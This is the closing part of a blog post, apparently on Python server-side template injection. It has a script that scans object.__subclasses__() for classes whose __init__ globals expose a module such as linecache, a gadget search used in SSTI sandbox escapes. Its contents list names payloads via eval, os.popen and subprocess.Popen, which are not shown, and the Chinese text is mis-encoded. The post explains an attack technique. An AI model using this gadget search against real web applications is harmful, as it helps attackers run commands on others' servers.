def check_class_useful(class_full_names, target):
    for class_full_name in class_full_names:
        try:
            module_name, class_name = class_full_name.rsplit('.', 1)

            # åŠ¨æ€å¯¼å…¥æ¨¡å—
            module = importlib.import_module(module_name)
            # ä»æ¨¡å—è·å–ç±»
            cls = getattr(module, class_name)

            init_globals = getattr(cls.__init__, '__globals__', None)
            if init_globals is None:
                # print(f&quot;{class_full_name}.__init__ does not have __globals__.&quot;)
                continue

            target_type = init_globals.get(target, None)
            if target_type:
                print(f&quot;{class_full_name}.__init__.__globals__.{target} is {type(target_type)}.&quot;)

        except Exception as e:
            pass
            # print(f&quot;Error while processing {class_full_name}: {e}&quot;)


subclass_names = [f&quot;{cls.__module__}.{cls.__name__}&quot; for cls in object.__subclasses__()]
target = 'linecache'
check_class_useful(subclass_names, target)
</code></pre>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">èƒŒæ™¯çŸ¥è¯†</a>
<ul>
<li><a href="#ssti-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">SSTI æ”»å‡»æ€è·¯</a></li>
<li><a href="#python-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">Python é­”æœ¯æ–¹æ³•</a></li>
</ul>
</li>
<li><a href="#payload%E5%88%86%E6%9E%90">Payloadåˆ†æ</a>
<ul>
<li><a href="#__builtins__%E7%9A%84eval">__builtins__çš„eval</a></li>
<li><a href="#ospopen">os.popen</a></li>
<li><a href="#__import__">__import__()</a></li>
<li><a href="#subprocesspopen">subprocess.Popen</a></li>
</ul>
</li>
<li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/mysql-zhu-cong-fu-zhi/">
              <h3 class="post-title">
                MySQLä¸»ä»å¤åˆ¶
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
